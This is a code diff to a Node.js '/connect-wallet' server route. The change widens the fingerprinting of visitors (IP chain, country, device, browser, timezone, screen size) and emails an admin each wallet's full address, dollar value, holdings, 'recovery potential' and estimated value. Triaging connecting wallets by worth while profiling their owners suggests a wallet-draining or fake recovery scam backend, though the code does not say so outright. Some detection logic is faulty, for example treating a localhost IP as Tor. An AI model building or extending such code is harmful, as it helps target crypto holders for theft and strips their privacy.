@@ -196,36 +196,90 @@ router.post('/connect-wallet', async (req, res) => {
       else if (userAgent.includes('Edge')) browser = 'Edge';
       else if (userAgent.includes('Opera')) browser = 'Opera';
       
-      // Security fingerprinting
+      // Advanced security analysis
       const deviceFingerprint = Buffer.from(userAgent + realIP).toString('base64').slice(0, 12);
-      let riskScore = 0;
-      if (realIP.includes('127.0.0.1') || realIP.includes('::1')) riskScore += 2;
-      if (userAgent === 'Unknown' || userAgent.length < 50) riskScore += 3;
-      if (!referer || referer === 'Direct') riskScore += 1;
-      const riskLevel = riskScore >= 5 ? 'HIGH' : riskScore >= 3 ? 'MEDIUM' : 'LOW';
+      const sessionStart = new Date().toISOString();
+      const timezone = req.headers['x-timezone'] || 'Unknown';
+      const screenRes = req.headers['x-screen-resolution'] || 'Unknown';
+      const connection = req.headers['connection'] || 'unknown';
+      const cacheControl = req.headers['cache-control'] || 'not-set';
       
-      // Clean admin notification
+      // Deep device analysis
+      const isBot = /bot|crawler|spider|scraper/i.test(userAgent);
+      const isVPN = realIP.split(',').length > 2; // Multiple IPs suggest VPN/Proxy
+      const isTor = realIP.includes('127.0.0.1') || country === 'Unknown';
+      const browserVersion = userAgent.match(/Chrome\/(\d+)/) || userAgent.match(/Firefox\/(\d+)/) || ['', 'Unknown'];
+      const osInfo = userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'macOS' : userAgent.includes('Linux') ? 'Linux' : userAgent.includes('Android') ? 'Android' : userAgent.includes('iOS') ? 'iOS' : 'Unknown';
+      
+      // Wallet behavior analysis
+      const walletAge = 'New'; // Could check blockchain for first transaction
+      const walletActivity = portfolioData.assets.length > 0 ? 'Active' : 'Empty';
+      const multiChain = portfolioData.chains.length > 1;
+      
+      // Risk scoring with detailed factors
+      let riskScore = 0;
+      let riskFactors = [];
+      
+      if (realIP.includes('127.0.0.1') || realIP.includes('::1')) {
+        riskScore += 3; riskFactors.push('Localhost IP');
+      }
+      if (isBot) {
+        riskScore += 4; riskFactors.push('Bot User Agent');
+      }
+      if (isVPN) {
+        riskScore += 2; riskFactors.push('VPN/Proxy detected');
+      }
+      if (isTor) {
+        riskScore += 3; riskFactors.push('Tor/Anonymous network');
+      }
+      if (userAgent === 'Unknown' || userAgent.length < 50) {
+        riskScore += 2; riskFactors.push('Suspicious User Agent');
+      }
+      if (!referer || referer === 'Direct') {
+        riskScore += 1; riskFactors.push('Direct access');
+      }
+      if (country === 'Unknown') {
+        riskScore += 1; riskFactors.push('Unknown location');
+      }
+      
+      const riskLevel = riskScore >= 7 ? 'CRITICAL' : riskScore >= 5 ? 'HIGH' : riskScore >= 3 ? 'MEDIUM' : 'LOW';
+      
+      // Geolocation intelligence
+      const countryRisk = ['CN', 'RU', 'KP', 'IR'].includes(country) ? 'High-Risk Country' : 'Normal';
+      const timezoneMismatch = timezone !== 'Unknown' && !timezone.includes(country) ? 'Timezone Mismatch' : 'Normal';
+      
+      // Comprehensive admin notification
       const emailSent = await sendAdminNotification(
-        `NEW WALLET: ${walletAddress.slice(0,8)}... - $${portfolioData.totalValue.toFixed(0)} - ${riskLevel} RISK`,
-        `PRODUCTION WALLET CONNECTION\n\n` +
-        `WALLET: ${walletAddress}\n` +
-        `PORTFOLIO: $${portfolioData.totalValue.toFixed(2)} (${portfolioData.assets.length} assets)\n` +
-        `CHAINS: ${portfolioData.chains.join(', ') || 'None'}\n\n` +
-        `SECURITY ANALYSIS:\n` +
-        `Risk Level: ${riskLevel} (Score: ${riskScore}/10)\n` +
-        `Device ID: ${deviceFingerprint}\n` +
-        `Real IP: ${realIP}\n` +
-        `Country: ${country}\n` +
-        `Referer: ${referer}\n\n` +
-        `DEVICE DETAILS:\n` +
-        `Type: ${isMobile ? 'Mobile' : 'Desktop'}\n` +
-        `Wallet: ${isMetaMask ? 'MetaMask' : 'Web Wallet'}\n` +
-        `Browser: ${browser}\n` +
-        `Language: ${acceptLanguage}\n` +
-        `Encoding: ${acceptEncoding}\n` +
-        `DNT: ${dnt}\n\n` +
-        `TIME: ${new Date().toISOString()}\n` +
-        `RECOVERY OPS: ${portfolioData.recoveryOpportunities}`
+        `${riskLevel} RISK: ${walletAddress.slice(0,8)}... - ${country} - $${portfolioData.totalValue.toFixed(0)}`,
+        `=== PRODUCTION WALLET CONNECTION ===\n\n` +
+        `WALLET ANALYSIS:\n` +
+        `Address: ${walletAddress}\n` +
+        `Portfolio: $${portfolioData.totalValue.toFixed(2)} (${portfolioData.assets.length} assets)\n` +
+        `Chains: ${portfolioData.chains.join(', ') || 'None'}\n` +
+        `Activity: ${walletActivity} | Age: ${walletAge} | Multi-chain: ${multiChain}\n\n` +
+        `THREAT INTELLIGENCE:\n` +
+        `Risk Level: ${riskLevel} (${riskScore}/15 points)\n` +
+        `Risk Factors: ${riskFactors.length > 0 ? riskFactors.join(', ') : 'None detected'}\n` +
+        `Device Fingerprint: ${deviceFingerprint}\n` +
+        `Bot Detection: ${isBot ? 'DETECTED' : 'Clean'}\n` +
+        `VPN/Proxy: ${isVPN ? 'DETECTED' : 'Direct'}\n` +
+        `Tor Network: ${isTor ? 'POSSIBLE' : 'No'}\n\n` +
+        `GEOLOCATION INTEL:\n` +
+        `IP Chain: ${realIP}\n` +
+        `Country: ${country} (${countryRisk})\n` +
+        `Timezone: ${timezone} (${timezoneMismatch})\n` +
+        `Entry Point: ${referer}\n\n` +
+        `TECHNICAL PROFILE:\n` +
+        `Device: ${isMobile ? 'Mobile' : 'Desktop'} | OS: ${osInfo}\n` +
+        `Browser: ${browser} ${browserVersion[1]} | Wallet: ${isMetaMask ? 'MetaMask' : 'Web'}\n` +
+        `Language: ${acceptLanguage.split(',')[0]} | Encoding: ${acceptEncoding}\n` +
+        `Privacy: DNT=${dnt} | Cache=${cacheControl}\n` +
+        `Connection: ${connection} | Screen: ${screenRes}\n\n` +
+        `SESSION DATA:\n` +
+        `Started: ${sessionStart}\n` +
+        `Recovery Potential: ${portfolioData.recoveryOpportunities} opportunities\n` +
+        `Estimated Value: $${portfolioData.estimatedRecoverable * 3000 || 0}\n\n` +
+        `ACTION REQUIRED: ${riskLevel === 'CRITICAL' || riskLevel === 'HIGH' ? 'MONITOR CLOSELY' : 'Standard monitoring'}`
       );
       
       if (emailSent) {
